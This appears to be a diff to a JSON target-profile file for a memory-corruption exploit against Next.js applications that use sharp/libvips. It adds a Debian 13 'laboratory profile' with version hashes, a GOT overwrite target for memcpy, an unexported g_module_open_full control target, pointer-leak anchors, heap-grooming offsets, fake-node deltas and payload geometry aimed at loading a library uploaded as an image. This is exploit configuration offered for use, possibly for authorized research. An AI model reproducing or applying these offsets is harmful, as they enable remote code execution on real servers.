@@ -56,9 +56,10 @@
           "anchors": [
             {"offset": "0x1be1b0", "minimum_repetitions": 1},
             {"offset": "0x1c3120", "minimum_repetitions": 1},
-            {"offset": "0x1c3130", "minimum_repetitions": 1}
+            {"offset": "0x1c3130", "minimum_repetitions": 1},
+            {"offset": "0x33cd0c", "minimum_repetitions": 1}
           ],
-          "required_anchors": 3,
+          "required_anchors": 4,
           "scan_start": 0,
           "scan_end": 1048576,
           "scan_step": 8,
@@ -127,6 +128,149 @@
         "record_marker": "0x5b5b5b5b00000000",
         "record_prefix_qwords": [0, "0x75", "0x8", "0x700000007", "0x200000002", 3],
         "fake_node_delta_from_anchor_page": "-0x690"
+      },
+      "payload": {
+        "tile_width": 116,
+        "tile_height": 33,
+        "grid_rows": 4,
+        "grid_columns": 1,
+        "canvas_stride": 64,
+        "fake_node_local_row": 1,
+        "path_field_bytes": 16,
+        "write_target_backoff": 16,
+        "preserved_prefix_bytes": 16,
+        "chunk_header_offset": 16,
+        "chunk_header_size": 16,
+        "redirect_pointer_offset": 56,
+        "redirect_pointer_size": 2
+      }
+    },
+    "debian13-node-20.19.2-pie-sharp-0.34.4-linux-x64": {
+      "description": "Pinned KAN-2162 Debian 13 APT Node Next.js/sharp laboratory profile",
+      "architecture": "x86_64",
+      "packages": {
+        "next": {
+          "version": "15.5.23",
+          "package_manifest_sha256": "b21db7d574da310b9752a60f16acc47c000a5748fb0174ee07c29a2b6408d6e3"
+        },
+        "sharp": {
+          "version": "0.34.4",
+          "package_manifest_sha256": "9342b4beebce46228f7767e5e486348b45ae911001527c989e6eab971eb5d74d"
+        }
+      },
+      "application": {
+        "upload_endpoint": "/api/upload",
+        "optimize_endpoint": "/api/optimize",
+        "upload_directory": "uploads",
+        "library_name": "x.jpg",
+        "library_content_type": "image/jpeg",
+        "max_library_path_bytes": 16
+      },
+      "node": {
+        "version": "20.19.2",
+        "elf_type": "ET_DYN",
+        "filename": "node",
+        "build_id": "339440d6f33368ed4fb57f3c214d62163e2201c4",
+        "sha256": "ca0728526aa1cc4e3056decec848ecc6d2c5391cecdd4e21a0ebd221d665c84e"
+      },
+      "libvips": {
+        "version": "8.17.2",
+        "package": "@img/sharp-libvips-linux-x64",
+        "package_version": "1.2.3",
+        "filename": "libvips-cpp.so.8.17.2",
+        "build_id": "2c8b33114a735268d2211ca2003bc4a327b81411",
+        "sha256": "633fb29f22eecf615553de6d98b7a9eafa06e6d2a26907cafeb54cfa3deaa943",
+        "package_manifest_sha256": "797f1c20f00aca2e29ed5ae76221584bf5f5243fd594de4196b5e52bbf018ff1",
+        "versions_manifest_sha256": "ea721df9faa28d47cb0b4e0be1b19f405dc75204f26f9331a485ca167c60cd22",
+        "memcpy_got": {
+          "symbol": "memcpy@GLIBC_2.14",
+          "offset": "0xf83098",
+          "relocation": "R_X86_64_JUMP_SLOT"
+        },
+        "control_target": {
+          "module": "libvips",
+          "symbol": "g_module_open_full",
+          "exported": false,
+          "offset": "0x3e995e",
+          "abi": "path_rdi_flags_esi_error_rdx",
+          "bytes": "4157415641554989fd31ff415455534883ec48897424144889542418e8b1fdff"
+        },
+        "leak": {
+          "anchors": [
+            {"offset": "0x1be1b0", "minimum_repetitions": 1},
+            {"offset": "0x1c3120", "minimum_repetitions": 1},
+            {"offset": "0x1c3130", "minimum_repetitions": 1},
+            {"offset": "0x1de9c0", "minimum_repetitions": 1}
+          ],
+          "required_anchors": 4,
+          "scan_start": 0,
+          "scan_end": 1048576,
+          "scan_step": 8,
+          "pointer_min": "0x0000500000000000",
+          "pointer_max": "0x0000800000000000",
+          "base_alignment": "0x1000",
+          "supporting_hints": {
+            "image_geometry": "128x8192"
+          }
+        }
+      },
+      "libheif": {
+        "version": "1.20.2",
+        "versions_manifest_key": "heif"
+      },
+      "glibc": {
+        "version": "2.41-12+deb13u4",
+        "filename": "libc.so.6",
+        "build_id": "5e5b51f4c39af9ac589408c1dc432ba390a273cc",
+        "sha256": "9792e3cbb541c8f44c7acf5f14f4022ea62998ecc787d326bed4d8b6547dfd92",
+        "root_chunk_size_and_flags": "0x75"
+      },
+      "libstdcxx": {
+        "version": "6.0.33",
+        "filename": "libstdc++.so.6.0.33",
+        "build_id": "133b71e0013695cc7832680a74edb51008c4fc4c",
+        "sha256": "972bb2a18b71140dab0240f8a1f68ab3fb1d56bcd4c4f824a91b70888faf5a00"
+      },
+      "abi": {
+        "rb_tree_node": {
+          "size": 96,
+          "left_offset": 16,
+          "right_offset": 24,
+          "key_offset": 32
+        },
+        "image_plane": {
+          "datatype_offset": 40,
+          "bits_per_pixel_offset": 44,
+          "components_offset": 45,
+          "width_offset": 48,
+          "height_offset": 52,
+          "mem_offset": 64,
+          "stride_offset": 88,
+          "unsigned_datatype": 0,
+          "cr_channel": 2
+        }
+      },
+      "heap_calibration": {
+        "record_variant": "pie_tail",
+        "selector_strategy": "profile_page_lane",
+        "minimum_observations": 1,
+        "anchor_rank": 0,
+        "scan_start": "0xe0000",
+        "scan_end": 1048576,
+        "anchor_alignment": "0x1000",
+        "anchor_page_offset_min": "0xc00",
+        "anchor_page_offset_max": "0xf00",
+        "anchor_page_low16": "0x6000",
+        "arena_alignment": "0x4000000",
+        "arena_sentinel_offset": "0x98",
+        "record_chunk_size_and_flags": "0x71",
+        "anchor_peer_delta": "0x50",
+        "related_pointer_delta_min": "0x60000",
+        "related_pointer_delta_max": "0x70000",
+        "libvips_record_offsets": ["0x33cd0f", "0x33de99", "0x1b8480"],
+        "record_marker": "0x5b5b5b5b00000000",
+        "record_prefix_qwords": [0, "0x75", "0x8", "0x700000007", "0x200000002", 3],
+        "fake_node_delta_from_anchor_page": "-0x3a0"
       },
       "payload": {
         "tile_width": 116,
